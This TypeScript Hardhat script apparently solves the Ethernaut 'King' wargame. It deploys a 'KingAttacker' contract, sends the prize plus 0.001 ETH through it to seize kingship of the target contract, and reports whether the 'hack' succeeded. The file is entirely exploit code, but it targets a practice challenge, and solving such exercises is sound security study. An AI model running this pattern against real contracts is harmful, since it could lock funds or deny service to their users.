import { ethers } from "hardhat";

const CONTRACT_NAME = "King";
const CONTRACT_ADDRESS = "0x5BC0DF8D6B1e04db8EA2F14293258708082DEf4E";
const CONTRACT_ATTACKER_NAME = "KingAttacker";

async function hack() {
  const [wallet] = await ethers.getSigners();

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  //deploy attacker contract
  const attackerFactory = await ethers.getContractFactory(
    CONTRACT_ATTACKER_NAME
  );
  const attackerContract = await attackerFactory.deploy(CONTRACT_ADDRESS);

  //get initial prize
  const initialPrice = await contract.prize();
  console.log("Initial Price :", initialPrice);

  const value = ethers.utils.parseEther("0.001").add(initialPrice);
  console.log("Value :", value.toString());

  const txAttacker = await attackerContract.attack({
    value: value,
    gasLimit: 100000,
  });
  await txAttacker.wait();

  //get Kingship
  let kingshipAddress = await contract._king();
  console.log("Kingship Address :", kingshipAddress);

  if (attackerContract.address === kingshipAddress)
    console.log("🚀 Contract hacked");
  else console.log("❌ Contract not hacked");
}

hack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
